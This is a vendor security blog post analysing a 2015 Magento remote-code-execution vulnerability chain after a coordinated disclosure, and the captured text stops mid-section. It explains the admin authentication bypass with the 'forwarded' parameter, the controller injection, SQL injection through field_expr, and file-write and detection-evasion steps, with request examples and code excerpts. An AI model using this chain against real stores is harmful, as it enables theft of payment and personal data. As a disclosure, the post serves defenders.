=== Content from blog.checkpoint.com_0817c579_20250124_194036.html ===


[Get a Demo](https://www.checkpoint.com/demos/)
[Contact Us](https://www.checkpoint.com/about-us/contact-us/)
[Support](https://supportcenter.checkpoint.com/)
[Log In](https://usercenter.checkpoint.com/usercenter/index.jsp)
![Search](https://www.checkpoint.com/wp-content/themes/checkpoint-theme-v2/images/search.png)

![Languages](https://www.checkpoint.com/wp-content/themes/checkpoint-theme-v2/images/intl.png)

* Choose your language...
* [English (English)](https://www.checkpoint.com/)
* [Spanish (Español)](https://www.checkpoint.com/es/)
* [French (Français)](https://www.checkpoint.com/fr/)
* [German (Deutsch)](https://www.checkpoint.com/de/)
* [Italian (Italiano)](https://www.checkpoint.com/it/)
* [Portuguese (Português)](https://www.checkpoint.com/pt/)
* [Japanese (日本語)](https://www.checkpoint.com/jp/)
* [Chinese (中文)](https://www.checkpoint.com.cn/)
* [Korean (한국어)](https://www.checkpoint.com/kr/)
* [Taiwan (繁體中文)](https://www.checkpoint.com/tw/)

* Search
* Geo Menu
  + - Choose your language...
    - [English (English)](https://www.checkpoint.com/)
    - [Spanish (Español)](https://www.checkpoint.com/es/)
    - [French (Français)](https://www.checkpoint.com/fr/)
    - [German (Deutsch)](https://www.checkpoint.com/de/)
    - [Italian (Italiano)](https://www.checkpoint.com/it/)
    - [Portuguese (Português)](https://www.checkpoint.com/pt/)
    - [Japanese (日本語)](https://www.checkpoint.com/jp/)
    - [Chinese (中文)](https://www.checkpoint.com.cn/)
    - [Korean (한국어)](https://www.checkpoint.com/kr/)
    - [Taiwan (繁體中文)](https://www.checkpoint.com/tw/)

* Products
  + Network & SASE
    - [**NETWORK**](https://www.checkpoint.com/quantum/)
    - [Next-generation Firewalls](https://www.checkpoint.com/quantum/next-generation-firewall/)
    - [Firewall Cluster](https://www.checkpoint.com/quantum/maestro-hyperscale-network-security/)
    - [Industrial Firewalls](https://www.checkpoint.com/quantum/next-generation-firewall/industrial-control-systems-appliances/)
    - [SMB Firewalls](https://www.checkpoint.com/quantum/next-generation-firewall/small-business-firewall/)
    - [DDoS Protection](https://www.checkpoint.com/quantum/ddos-protector/)
    - [Security Management](https://www.checkpoint.com/quantum/unified-management/)
    - [SD-WAN](https://www.checkpoint.com/quantum/sd-wan/)
    - [Remote Access VPN](https://www.checkpoint.com/quantum/remote-access-vpn/)
    - [**SASE**](https://www.checkpoint.com/harmony/sase/)
    - [Private Access](https://www.checkpoint.com/harmony/sase/private-access/)
    - [Internet Access](https://www.checkpoint.com/harmony/sase/internet-access/)
  + Cloud & Applications
    - [**CLOUD**](https://www.checkpoint.com/cloudguard/)
    - [Cloud Network Security](https://www.checkpoint.com/cloudguard/cloud-network-security/)
    - [Cloud Virtual WAN](https://www.checkpoint.com/cloudguard/microsoft-azure-security/wan/)
    - [Cloud Native Application Protection Platform](https://www.checkpoint.com/cloudguard/cnapp/)
    - [Cloud Security Posture Management (CSPM)](https://www.checkpoint.com/cloudguard/cloud-security-posture-management/)
    - [Workload Protection](https://www.checkpoint.com/cloudguard/workload-protection/)
    - [Cloud Infrastructure Entitlement Management (CIEM)](https://www.checkpoint.com/cloudguard/cloud-infrastructure-entitlement-management/)
    - [Code Security](https://www.checkpoint.com/cloudguard/developer-security/)
    - [Web Application and API Security](https://www.checkpoint.com/cloudguard/appsec/)
    - [**WORKSPACE**](https://www.checkpoint.com/harmony/)
    - [Email & Collaboration](https://www.checkpoint.com/harmony/email-security/email-office/)
    - [Mobile](https://www.checkpoint.com/harmony/mobile-security/mobile/)
    - [Endpoint](https://www.checkpoint.com/harmony/advanced-endpoint-protection/)
    - [Browse](https://www.checkpoint.com/harmony/browse/)
  + [Security Operations](https://www.checkpoint.com/infinity/soc/)
    - [External Risk Management](https://www.checkpoint.com/infinity/soc/external-risk-management/)
    - [Extended Detection and Response (XDR)](https://www.checkpoint.com/infinity/xdr-xpr/)
    - [Managed Detection and Response (MDR)](https://www.checkpoint.com/horizon/mdr-mpr/)
    - [Cloud Detection & Response (CDR)](https://www.checkpoint.com/cloudguard/cloud-intelligence-threat-hunting/)
    - [Unified Events](https://www.checkpoint.com/infinity/events/)
    - [Security Automation Playbooks](https://www.checkpoint.com/infinity/playblocks/)
  + [AI](https://www.checkpoint.com/infinity/ai/)
    - [Threat Prevention & Intelligence](https://www.checkpoint.com/ai/threatcloud/)
    - [AI Cloud Infrastructure](https://www.checkpoint.com/ai/cloudprotect/)
    - [AI Copilot Assistant](https://www.checkpoint.com/ai/copilot/)
    - [GenAI Security](https://www.checkpoint.com/solutions/genai-security/)
    - [View Products A-Z](https://www.checkpoint.com/products/)
* Solutions

  Use Cases
  - [Anti-Ransomware](https://www.checkpoint.com/solutions/ransomware-protection/)
  - [Collaboration Security](https://www.checkpoint.com/solutions/cloud-collaboration/)
  - [Compliance](https://www.checkpoint.com/solutions/compliance-governance/)
  - [Developer Security & Operations](https://www.checkpoint.com/cloudguard/devsecops/)
  - [Email Security](https://www.checkpoint.com/solutions/email-security-solution/)
  - [Generative AI](https://www.checkpoint.com/solutions/genai-security/)
  - [Hybrid Cloud](https://www.checkpoint.com/solutions/hybrid-data-center-security/)
  - [Hybrid Mesh Firewall](https://www.checkpoint.com/solutions/hybrid-mesh-firewall/)
  - [IoT Security Solutions](https://www.checkpoint.com/solutions/iot-security/)
  - [SD-WAN](https://www.checkpoint.com/solutions/sd-wan-security/)
  - [Threat Hunting](https://www.checkpoint.com/solutions/threat-hunting/)
  - [Zero Trust & Least Privilege](https://www.checkpoint.com/solutions/zero-trust-security/)

  Industry
  - [Education](https://www.checkpoint.com/industry/education/)
  - [Federal Government](https://www.checkpoint.com/industry/government-federal-security/)
  - [Financial Services](https://www.checkpoint.com/industry/financial-services/)
  - [Healthcare](https://www.checkpoint.com/industry/healthcare/)
  - [Retail](https://www.checkpoint.com/industry/retail/)
  - [State and Local Government](https://www.checkpoint.com/industry/government-state-local-security/)
  - [Telco / Service Provider](https://www.checkpoint.com/industry/service-provider/)
  Business Size
  - [Large Enterprise](https://www.checkpoint.com/solutions/enterprise-network-security/)
  - [Small & Medium Business](https://www.checkpoint.com/solutions/small-medium-business-security/)
* Products
  + Network
    - [**Next-generation Firewalls**](https://www.checkpoint.com/quantum/next-generation-firewall/)
    - [**Firewall Cluster**](https://www.checkpoint.com/quantum/maestro-hyperscale-network-security/)
    - [**Industrial Firewalls**](https://www.checkpoint.com/quantum/next-generation-firewall/industrial-control-systems-appliances/)
    - [**SMB Firewalls**](https://www.checkpoint.com/quantum/next-generation-firewall/small-business-firewall/)
    - [**DDoS Protection**](https://www.checkpoint.com/quantum/ddos-protector/)
    - [**Security Management**](https://www.checkpoint.com/quantum/unified-management/)
    - [**SD-WAN**](https://www.checkpoint.com/quantum/sd-wan/)
    - [**Remote Access VPN**](https://www.checkpoint.com/quantum/remote-access-vpn/)
  + SASE
    - [**Private Access**](https://www.checkpoint.com/harmony/sase/private-access/)
    - [**Internet Access**](https://www.checkpoint.com/harmony/sase/internet-access/)
  + Cloud
    - [**Cloud Network Security**](https://www.checkpoint.com/cloudguard/cloud-network-security/)
    - [**Cloud Virtual WAN**](https://www.checkpoint.com/cloudguard/microsoft-azure-security/wan/)
    - [**Cloud Native Application Protection Platform**](https://www.checkpoint.com/cloudguard/cnapp/)
    - [**Cloud Security Posture Management (CSPM)**](https://www.checkpoint.com/cloudguard/cloud-security-posture-management/)
    - [**Workload Protection**](https://www.checkpoint.com/cloudguard/workload-protection/)
    - [**Cloud Infrastructure Entitlement Management (CIEM)**](https://www.checkpoint.com/cloudguard/cloud-infrastructure-entitlement-management/)
    - [**Code Security**](https://www.checkpoint.com/cloudguard/developer-security/)
    - [**Web Application and API Security**](https://www.checkpoint.com/cloudguard/appsec/)
  + Workspace
    - [**Email & Collaboration**](https://www.checkpoint.com/harmony/email-security/email-office/)
    - [**Mobile**](https://www.checkpoint.com/harmony/mobile-security/mobile/)
    - [**Endpoint**](https://www.checkpoint.com/harmony/advanced-endpoint-protection/)
    - [**Browse**](https://www.checkpoint.com/harmony/browse/)
  + Security Operations
    - [**External Risk Management**](https://www.checkpoint.com/infinity/soc/external-risk-management/)
    - [**Extended Detection and Response (XDR)**](https://www.checkpoint.com/infinity/xdr-xpr/)
    - [**Managed Detection and Response (MDR)**](https://www.checkpoint.com/horizon/mdr-mpr/)
    - [**Cloud Detection & Response (CDR)**](https://www.checkpoint.com/cloudguard/cloud-intelligence-threat-hunting/)
    - [**Unified Events**](https://www.checkpoint.com/infinity/events/)
    - [Security Automation Playbooks](https://www.checkpoint.com/infinity/playblocks/)
  + AI
    - [**Threat Prevention & Intelligence**](https://www.checkpoint.com/ai/threatcloud/)
    - [**AI Cloud Infrastructure**](https://www.checkpoint.com/ai/cloudprotect/)
    - [**AI Copilot Assistant**](https://www.checkpoint.com/ai/copilot/)
    - [**GenAI Security**](https://www.checkpoint.com/solutions/genai-security/)

* Solutions
  + Use Cases
    - [**Anti-Ransomware**](https://www.checkpoint.com/solutions/ransomware-protection/)
    - [**Collaboration Security**](https://www.checkpoint.com/solutions/cloud-collaboration/)
    - [**Compliance**](https://www.checkpoint.com/solutions/compliance-governance/)
    - [**Developer Security & Operations**](https://www.checkpoint.com/cloudguard/devsecops/)
    - [**Email Security**](https://www.checkpoint.com/solutions/email-security-solution/)
    - [**Generative AI**](https://www.checkpoint.com/solutions/genai-security/)
    - [**Hybrid Cloud**](https://www.checkpoint.com/solutions/hybrid-data-center-security/)
    - [**Hybrid Mesh Firewall**](https://www.checkpoint.com/solutions/hybrid-mesh-firewall/)
    - [**IoT Security Solutions**](https://www.checkpoint.com/solutions/iot-security/)
    - [**SD-WAN**](https://www.checkpoint.com/solutions/sd-wan-security/)
    - [**Threat Hunting**](https://www.checkpoint.com/solutions/threat-hunting/)
    - [**Zero Trust & Least Privilege**](https://www.checkpoint.com/solutions/zero-trust-security/)
  + Industry
    - [**Education**](https://www.checkpoint.com/industry/education/)
    - [**Federal Government**](https://www.checkpoint.com/industry/government-federal-security/)
    - [**Financial Services**](https://www.checkpoint.com/industry/financial-services/)
    - [**Healthcare**](https://www.checkpoint.com/industry/healthcare/)
    - [**Retail**](https://www.checkpoint.com/industry/retail/)
    - [**State and Local Government**](https://www.checkpoint.com/industry/government-state-local-security/)
    - [**Telco / Service Provider**](https://www.checkpoint.com/industry/service-provider/)
  + Organization Size
    - [**Large Enterprise**](https://www.checkpoint.com/solutions/enterprise-network-security/)
    - [**Small & Medium Business**](https://www.checkpoint.com/solutions/small-medium-business-security/)
* Platform
  + - [**Unified Platform Overview**](https://www.checkpoint.com/infinity/)
    - [**Infinity Platform Services**](https://www.checkpoint.com/infinity/core-services/)
    - [**Platform License Agreement**](https://www.checkpoint.com/infinity/platform-agreement/)
    - [**Single Management Portal**](https://www.checkpoint.com/infinity/portal/)
  + ![2025 Cyber Security Report](https://www.checkpoint.com/wp-content/uploads/navigation-500x250-1.jpg)
    ##### 2025 Cyber Security Report

    [DOWNLOAD REPORT](https://www.checkpoint.com/security-report/)
* Services
  + [Strategy and Risk](https://www.checkpoint.com/services/strategy-and-risk/)
    - [**Cyber Risk Assessment**](https://www.checkpoint.com/services/infinity-global/cyber-risk-assessment/)
    - [**vCISO Risk & Compliance Services**](https://www.checkpoint.com/services/infinity-global/ciso-advisory-service/)
    - [**Attack Surface Assessment**](https://www.checkpoint.com/services/infinity-global/external-attack-surface-assessment/)
    - [**Penetration Testing**](https://www.checkpoint.com/services/infinity-global/penetration-testing/)
    - [**Ransomware Readiness Assessment**](https://www.checkpoint.com/services/infinity-global/ransomware-readiness-assessment/)
  + [Professional Services](https://www.checkpoint.com/services/professional-services/)
    - [**Security Deployment and Optimization**](https://www.checkpoint.com/professional-services/)
    - [**Lifecycle Management Services**](https://www.checkpoint.com/support-services/lifecycle-management/)
    - [**Advanced Technical Account Management**](https://www.checkpoint.com/professional-services/account-management/)
  + [Training Programs](https://www.checkpoint.com/services/training/)
    - [**Training & Certification**](https://training-certifications.checkpoint.com/#/)
    - [**Security Awareness**](https://www.checkpoint.com/mind/smartawareness/)
    - [**CISO Training**](https://www.checkpoint.com/mind/ciso-academy/)
    - [**Hacking Point**](https://www.checkpoint.com/mind/hackingpoint/)
    - [**Secure Academy**](https://www.checkpoint.com/mind/secureacademy/)
  + [Incident Response](https://www.checkpoint.com/services/incident-response/)
    - [**Incident Response**](https://www.checkpoint.com/support-services/threatcloud-incident-response/)
    - [**Digital Forensics**](https://www.checkpoint.com/services/infinity-global/digital-forensics/)
    - [**Managed Detection and Response**](https://www.checkpoint.com/infinity/mdr-mpr/)
  + [Managed Security](https://www.checkpoint.com/services/managed-security/)
    - [**SOC-as-a-Service**](https://www.checkpoint.com/services/infinity-global/managed-xdr-with-siemsoar/)
    - [**Network Security and NOC-as-a-Service**](https://www.checkpoint.com/services/infinity-global/managed-firewall/)
    - [**Cloud & IT**](https://www.checkpoint.com/services/infinity-global/managed-cspm/)
    - [**Managed Firewall as a Service**](https://www.checkpoint.com/services/infinity-global/managed-firewall-as-a-service/)
    - [View All Services](https://www.checkpoint.com/services/)
* Resources
  + - [**Resource Center**](https://www.checkpoint.com/resources)
    - [**Blog**](https://blog.checkpoint.com/)
    - [**CheckMates Community**](https://community.checkpoint.com/)
    - [**Check Point Research**](https://research.checkpoint.com/)
    - [**Customer Stories**](https://www.checkpoint.com/customer-stories/)
    - [**Cyber Hub**](https://www.checkpoint.com/cyber-hub/)
    - [**Events & Webinars**](https://www.checkpoint.com/events/)
  + ![2025 Cyber Security Report](https://www.checkpoint.com/wp-content/uploads/navigation-500x250-1.jpg)
    ##### 2025 Cyber Security Report

    [DOWNLOAD REPORT](https://www.checkpoint.com/security-report/)
* Partners
  + - [**Become a Partner**](https://www.checkpoint.com/partners/channel/)
    - [**Find a Partner**](https://partnerlocator.checkpoint.com/#/)
    - [**Channel Partners**](https://www.checkpoint.com/partners/channel/)
    - [**Technology Partners**](https://www.checkpoint.com/technology-partners/)
    - [**MSSP Partners**](https://www.checkpoint.com/partners/mssp-program/)
    - [**AWS Cloud**](https://www.checkpoint.com/cloudguard/amazon-aws-security/)
    - [**Azure Cloud**](https://www.checkpoint.com/cloudguard/microsoft-azure-security/)
    - [**Partner Portal**](https://usercenter.checkpoint.com/usercenter/index.jsp)
  + ![...](https://www.checkpoint.com/wp-content/uploads/partners-cta-2.jpg)
    ##### Check Point is 100% Channel. Grow Your Business with Us!

    [Sign Up Now](https://www.checkpoint.com/partners/channel/)
* About Us
  + - [**Company**](https://www.checkpoint.com/about-us/)
    - [**Leadership**](https://www.checkpoint.com/about-us/leadership/)
    - [**Careers**](https://www.checkpoint.com/careers/)
    - [**Investor Relations**](https://www.checkpoint.com/about-us/investor-relations/)
    - [**Newsroom**](https://www.checkpoint.com/about-us/newsroom/)
  + ![...](https://www.checkpoint.com/wp-content/uploads/nadav-announcement-nav-500x250-1.jpg)
    ##### Nadav Zafrir Named New Check Point CEO

    [Learn More](https://www.checkpoint.com/press-releases/gil-shwed-takes-on-the-role-of-executive-chairman-of-the-board-of-directors-nadav-zafrir-becomes-ceo-at-check-point-software-technologies/)

* Search
  + Search
* Geo Menu
  + Choose your language...
  + [English (English)](https://www.checkpoint.com/)
  + [Spanish (Español)](https://www.checkpoint.com/es/)
  + [French (Français)](https://www.checkpoint.com/fr/)
  + [German (Deutsch)](https://www.checkpoint.com/de/)
  + [Italian (Italiano)](https://www.checkpoint.com/it/)
  + [Portuguese (Português)](https://www.checkpoint.com/pt/)
  + [Japanese (日本語)](https://www.checkpoint.com/jp/)
  + [Chinese (中文)](https://www.checkpoint.com.cn/)
  + [Korean (한국어)](https://www.checkpoint.com/kr/)
  + [Taiwan (繁體中文)](https://www.checkpoint.com/tw/)

[![Check Point Software Technologies Ltd.](https://www.checkpoint.com/wp-content/themes/checkpoint-theme-v2/images/checkpoint-logo.png?v=1.0)](https://www.checkpoint.com/ "Check Point Software Technologies Ltd.")
Toggle Navigation

[Blog Home](https://blog.checkpoint.com/) > Analyzing the Magento Vulnerability (Updated) Filter by:
Select category
Research  (603)
Security  (986)
Securing the Cloud  (318)
Harmony  (210)
Company and Culture  (43)
Innovation  (6)
Customer Stories  (21)
Infinity Security Operations  (5)
Securing the Network  (14)
Partners  (10)
Connect SASE  (10)
Email Security  (114)
Artificial Intelligence  (27)
Infinity Global Services  (21)
Crypto  (13)
Healthcare  (15)
Harmony SASE  (18)
MSSP  (5)
Executive Insights  (231)

![](https://blog.checkpoint.com/wp-content/uploads/2015/04/ecommerce.png)
April 20, 2015
# Analyzing the Magento Vulnerability (Updated)

![author image](/wp-content/uploads/2023/02/author-image.png)
By**Netanel Rubin, Check Point Malware & Vulnerability Research Group**

Share

Check Point researchers recently discovered a critical RCE (remote code execution) vulnerability in the Magento web e-commerce platform that can lead to the complete compromise of any Magento-based store, including credit card information as well as other financial and personal data, affecting nearly two hundred thousand online shops.

Check Point privately disclosed the vulnerabilities together with a list of suggested fixes to eBay prior to public disclosure. A patch to address the flaws was released on February 9, 2015 (SUPEE-5344 [available here](https://www.magentocommerce.com/products/downloads/magento/)). Store owners and administrators are urged to apply the patch immediately if they haven’t done so already.

**What kind of attack is it?**

The vulnerability is actually comprised of a chain of several vulnerabilities that ultimately allow an unauthenticated attacker to execute PHP code on the web server. The attacker bypasses all security mechanisms and gains control of the store and its complete database, allowing credit card theft or any other administrative access into the system.

This attack is not limited to any particular plugin or theme. All the vulnerabilities are present in the Magento core, and affects any default installation of both Community and Enterprise Editions. Check Point customers are already protected from exploitation attempts of this vulnerability through the IPS software blade.

**How did Check Point discover this vulnerability?**

These vulnerabilities were discovered by Netanel Rubin of the Check Point Malware & Vulnerability Research Group. Check Point researchers often function as “white hat hackers”, discovering and protecting against security vulnerabilities before malicious actors are able to exploit them. This publication is part of Check Point’s ongoing efforts toward public security awareness and education of consumers and enterprises.

**How can I protect against the vulnerability?**

Magento-based e-Commerce businesses are advised to apply the designated patch SUPEE-5344 released by Magento. Although Check Point did not witness any exploitation attempts of this vulnerability in the wild, administrators are advised to monitor logs for patterns matching the technical description.

Check Point IPS currently protects against exploitation attempts of this vulnerability.

**Vulnerable Versions**

Confirmed vulnerable: 1.9.1.0 CE and 1.14.1.0 EE (Latest releases as of this writing).

**Synopsis**

Magento is a popular eCommerce platform purchased by eBay in 2011. It has 2 versions:

• A community version, which is open-sourced and contains code contributed from the community.

• An enterprise version, which offers more features as well as customer support and other premium benefits.

We discovered a vulnerability-chain which ultimately allows an unauthenticated attacker to execute PHP code in the vulnerable server. This chain consists of a number of vulnerabilities, which are described further in the technical description.

These vulnerabilities have been assigned CVE-2015-1397, CVE-2015-1398, CVE-2015-1399.

**Disclosure Timeline**

January 14, 2015 – First contact with Magento Security

January 15, 2015 – Provided complete vulnerability report including suggested fixes

February 9, 2015 – Patch Released by Magento (SUPEE-5344 available here)

April 22, 2015 – Public Disclosure

**Technical Description**

Before we begin the technical walkthrough resulting in the discovery of each vulnerability, we need to briefly explain how Magento extensively uses reflection-style code as a dynamic way of providing content.

Magento uses modules, which are directories that contain different pieces of functionality. Each module contains controllers, which are PHP class files that define actions, public methods in that class.

Each incoming request is parsed to understand which module, controller and action is requested by the user. The PATH\_INFO variable (the section of the URI after the resource/script file name) contains the requested model, controller, and action name, in this format:

```
GET /index.php/[MODULE_NAME]/[CONTROLLER_NAME]/[ACTION_NAME] HTTP/1.1
```

The dynamic controller loading logic uses this algorithm:

1. Determine if [MODULE\_NAME] exists in the modules white list.

2. If it exists, construct a class name in this format: Mage\_[MODULE\_NAME]\_[CONTROLLER\_NAME]Controller

3. Find a class file by replacing every ‘\_’ with ‘/’ and appending a ‘php’ extension.

4. If the file is found, include it.

For example, if we send this request:

```
GET /index.php/downloadable/file/ HTTP/1.1
```

The following class is loaded:

```
Mage_Downloadable_FileController
```

**Controlled Injections**

When an administrator user attempts to load a controller, the system appends the string ‘Adminhtml’ after the module name.

Therefore, if we add the ‘admin’ prefix to our request:

```
GET /index.php/admin/downloadable/file/ HTTP/1.1
```

We get the following class name (Note: the reflection loader repeats the module name after the ‘Adminhtml’ prefix):

```
Mage_Downloadable_Adminhtml_Downloadable_FileController
```

Therefore, in addition to the obvious LFI of any file with a ‘*Controller.php’* suffix (‘/index.php/downloadable/……file’), we can bypass admin authentication if we send this request:

```
GET /index.php/downloadable/Adminhtml_Downloadable_File/ HTTP/1.1
```

That will try to load this class:

```
Mage_Downloadable_Adminhtml_Downloadable_FileController
```

The weakness exposed here is that Magento’s code validates admin sessions only if a request contains the ‘/admin/’ prefix, and fails to detect this controller injection technique.

However, as mentioned earlier, a predefined module white list constrains the module names we can attempt to load. This list differs between user and admin contexts. Therefore, the controller injection technique (loading an admin-context module while in user-context) will only work for modules that exist in **both white lists** (controllers containing user and admin functionality). This greatly limits our attack surface.

A second drawback for attackers is that some modules implement additional checks for specific privileges. As we don’t have any privileges, these checks will fail.

These well-implemented safeguards really constrain our attack surface, and we could not find any critical (RCE, LFI with no suffix) vulnerabilities with this approach.

**Best Foot ‘Forwarded’**

Continuing in attacker mode, we next examined how the system determines if we are administrators when a controller is loaded.

For authentication-required controllers, we discovered that the system does not block access (using exit(), die; or similar) for unauthenticated users. Instead, the requested controller is replaced with a ‘login’ controller.

This code can be viewed here:

```
$requestedActionName = $request->getActionName();
$openActions = array(
    LIST_OF_OPEN_ACTIONS (login, reset password, etc.)
);

if (in_array($requestedActionName, $openActions)) {
    $request->setDispatched(true); // An open actions
} else { // Should check authentication
    if($user) { // A user exist
        $user->reload(); // Check validity of user
    }
    if (!$user || !$user->getId()) { // No user or no user ID
        if ($request->getPost('login')) { // Try to login
            TRY_TO_LOGIN
        }
	     // No active user session AND no user login - access denied
        if (!$request->getParam('forwarded')) {
            if ($request->getParam('isIframe')) {
                CHANGE_CONTROLLER
            } elseif($request->getParam('isAjax')) {
                CHANGE_CONTROLLER
            } else {
                CHANGE_CONTROLLER
            }
            return false;
        }
    }
}

Mage_Admin_Model_Observer::actionPreDispatchAdmin()

```

Note the highlighted ‘if’ statement that occurs after the system has detected that we are not authenticated and we are not attempting to log in.

• If the statement is **true**, the system changes our controller to one of the ‘denied access’ controllers, blocking us from the admin panel.

• If the statement is **false**, our controller remains unchanged and the system continues normally.

This is a simple control flow logic flaw, and we can bypass the checks by the simple addition of a ‘forwarded’ parameter to our request.

We believe this flaw resulted from an attempt to allow controllers to authenticate users bypassing the built-in login mechanism. The fact that this parameter can be controlled externally may have been overlooked.

This finding vastly widens our attack surface, as we can now access any admin module regardless of whether or not it offers functionality to regular users.

However, we are left with the restriction of using modules that do not implement additional privilege checking.

**Mage: Level 90**

There are very few modules that never check for privileges, and those modules do not usually do anything that would be of interest to an attacker. However, let’s take a look at the ‘*Cms\_Wysiwyg*’ controller in the ‘*Adminhtml*’ module. This controller has only one action named ‘directive’, which loads an image using a given path.

This is the relevant code from the controller:

```
// Get the ___directive parameter
$directive = $this->getRequest()->getParam('___directive');

// base64_decodes the input
$directive = Mage::helper('core')->urlDecode($directive);

// Filter the input
$url = Mage::getModel('cms/adminhtml_template_filter')->filter($directive);

// Try to load the image
try {
    $image = Varien_Image_Adapter::factory('GD2');
    $image->open($url);
    $image->display();
}

Mage_Adminhtml_Cms_WysiwygController::directiveAction()

```

*Excerpt from the “What You See is What You Gain access to” controller*

Any attempt to load a file that is not a valid image (such as a configuration file, typically sought after by attackers) results in an exception being raised, and a default image is displayed instead. As a result, we can’t use this controller for a local file disclosure attack.

However, let’s examine the ‘*filter()*’ function. In this controller, ‘*filter()*’ is defined as a method in ‘*cms/adminhtml\_template\_filter*.’

The ‘filter()’ function reviews the input and performs these steps:

*1. Locate blocks with this format: ‘{{FUNC\_NAME PARAM\_NAME=PARAM\_VALUE}}’

2. If found, attempt to call the function ‘[FUNC\_NAME]Directive’ in this class.

3. If called successfully, replace the block with the function output.*

As part of an attack, we can attempt to use any filter that admin templates use, and call any class method named ‘[FUNC]Directive.’ Unfortunately, many of these methods operate only if there are template parameters. As our template parsing instance doesn’t contain any, most of these methods are useless for our purposes.

Luckily, one function turned out very valuable: ‘*blockDirective()*’, which creates a Magento-“block” class under our control.

The class name is defined:

```
Mage_X_Block_Y
```

where ‘X’ and ‘Y’ are both under our current control.

Apart from the LFI this causes (triggered by the auto loading mechanism), we can thus create any block class we want.

**Note**: The LFI is no use to us on its own; most of the system files are class files, while other files do not contain code that we can exploit. As in the previous LFI, a null byte can be useful for this situation, but we don’t want our exploit to work only on old versions of PHP (null byte injections were fixed since 5.3.4).

After the system initializes the requested block, it continues to set its parameters using the function ‘*setDataUsingMethod()*’:

```
public function setDataUsingMethod($key, $args=array())
{
 $method = 'set'.$this->_camelize($key); // Parse the method name
 $this->$method($args); // Call the method
    return $this; // Return (Wow, such dynamics, very $this)
}

Mage_Core_Model_Email_Template_Filter::blockDirective ()

```

Where ‘*$key*’ is the name of one of the filter parameters we have entered and ‘*$args*’ is its value.

At this point, an attacker can call any method that starts with the ‘set’ prefix (e.g. ‘*setData()*’), passing an argument that he controls.

After the block is initialized and has its parameters set, ‘*blockDirective()*’ lets us call any method we want (from the block class)with no arguments.

We can now create an instance of any block class we want, set some of its properties, and then call any class method without arguments. The drawback for attackers is that blocks are usually responsible for the GUI parts of the system, and the majority of them can’t be used for anything potentially dangerous.

**A needle in a Magestack**

Determined to discover an exploitable function, we set out on another code-wide search. We found the ‘*getCsvFile()*’ method from the ‘*Mage\_Adminhtml\_Block\_Widget\_Grid*’ class, which exports the data contained in the block (data extracted from the DB) and saves it into a CSV file.Unfortunately for attackers, neither the file name nor its extension can be controlled.

Magento offers the option of filtering what data is extracted, by adding different conditions to the actual SQL query.

This is the routine logic:

1. Retrieve the ‘*filter*’ parameter from the request.

2. Parse it using ‘*parse\_str()*’.

3. Loop on each parameter name and check for a matching condition name.

4. If a match is found, parse and escape the parameter so it will be safe to use in the query based on the condition type used.

5. Add the parsed condition to the SQL query.

For a regular text string used as a filter in an SQL condition, the condition parsing is performed by inserting the string into a ‘*LIKE*’ statement with two surrounding ’%’ chars. The resulting ‘*WHERE*’ statement is similar to:

```
WHERE `attr` LIKE ‘%escaped_text_string%’
```

Other filtering conditions (‘*id*’, ‘*range*’) are processed differently. For example, the class ‘*Mage\_Adminhtml\_Block\_Report\_Search\_Grid*’ displays every search query that is performed. One of its condition parameters, ‘*popularity*’, is considered a ‘*range*’ condition. This means we can insert 2 parameters, ‘*from*’ and ‘*to*’, to create a range operation on the ‘*popularity*’ column of the search term.

The condition parsing is seen here (where we control ‘*$condition*’):

```
$conditionKeyMap = array(
    // A dictionary containing operation and their matching SQL
    CONDITION_DICTIONARY_MAP
);

$query = '';
// If the condition is an array
if (is_array($condition)) {
    // If there's a 'field_expr' field, assign it to $fieldName
    if (isset($condition['field_expr'])) {
        $fieldName = str_replace('#?', $this->quoteIdentifier($fieldName), $condition['field_expr']);
        unset($condition['field_expr']);
    }
    …
    // Add the start condition
    if (isset($condition['from'])) {
        $from = $this->_prepareSqlDateCondition($condition, 'from');
        $query = $this->_prepareQuotedSqlCondition($conditionKeyMap['from'], $from, $fieldName);
    }
    // Add the end condition
    if (isset($condition['to'])) {
        $query .= empty($query) ? '' : ' AND ';
        $to = $this->_prepareSqlDateCondition($condition, 'to');
        $query = $this->_prepareQuotedSqlCondition($query . $conditionKeyMap['to'], $to, $fieldName);
    }
    …
}

Varien_Db_Adapter_Pdo_Mysql::prepareSqlCondition ()

```

Note the highlighted line where ‘*$fieldname*’ is replaced with a value arriving from ‘*$condition.*’ This means we can control the field name on which the condition is performed if we can assign a ‘*field\_expr*’ key in the condition dictionary. Since the field name is considered secure, it’s not escaped.

As attackers, we want to control the entire dictionary. The system attempts to validate our input by passing it into a validator function as seen here:

```
// This is the actual array from the request parameter
$value = $this->getData('value');

// Checks for a 'from' and 'to' keys (I edited the ‘if’ statement a little bit so it’ll be convenient to read)
if (strlen($value['from']) > 0) || strlen($value['to']) > 0) {
return $value; // Just return the dictionary as it!
}

Mage_Adminhtml_Block_Widget_Grid_Column_Filter_Range::getValue()

```

Therefore, if there are ‘from’ and ‘to’ keys in the dictionary, the function returns the dictionary as is, without unsetting any of its elements.

Now that we control the entire dictionary, we can inject any SQL we want. Fortunately for attackers, Magento uses PHP PDO, **which by default supports multiple queries in a single statement**. In our case, Magento assigns ‘PDO::ATTR\_EMULATE\_PREPARES’ to ‘true’, which forces PDO to enable multiple queries support. This means we can go beyond ‘union select’ statement injections, and inject any query we want.

There is no shortage of effective SQLi exploitation ideas. For example, we could add another administrator account in the DB and could completely compromise the system.

Such a change is too visible, however, and is still not as deep as an RCE could potentially go. We decided to keep looking for vectors to gain access to the RCE holy grail.

We can use the SQLi to add another file to the server by inserting our data to the ‘core\_file\_storage’ table which stores media files locally. When we access the ‘get.php’ page and request the file we just inserted, the files are created in the actual file system under the ‘media’ directory.

**Dodging Detection**

A drawback for attackers is that the system disables CGI execution in this directory using an ‘*.htaccess*’ file explicitly declaring ‘Options –ExecCGI.’ In order to bypass that safeguard, we can create another ‘*.htaccess*’ file in a subdirectory and override the parent declaration. However, this is a common exploitation trick, easily detected when looking for suspicious red flags in the server.

Similarly, we will avoid using the previously mentioned LFI as we don’t want to introduce the very suspicious artifact of a ‘.php’ file in an image directory.We therefore need to find a creative way to execute a ‘.jpg’ file without using another ‘.htaccess.’

The ‘*Mage\_Core\_Block\_Template\_Zend*’ class has 2 methods: ‘*setScriptPath()*’ and ‘*fetchView()*.’ ‘*fetchView()*’ takes a template file as an argument and calls the ‘*render()*’ method at ‘*Zend\_View\_Abstract*’. It then parses the template file’s full path and includes it without forcing another extension.

Examine the following code:

```
// Check for any path traversal in the template name
if ($this->isLfiProtectionOn() && preg_match('#\.\.[\\\/]#', $name)) {
   DIE
}
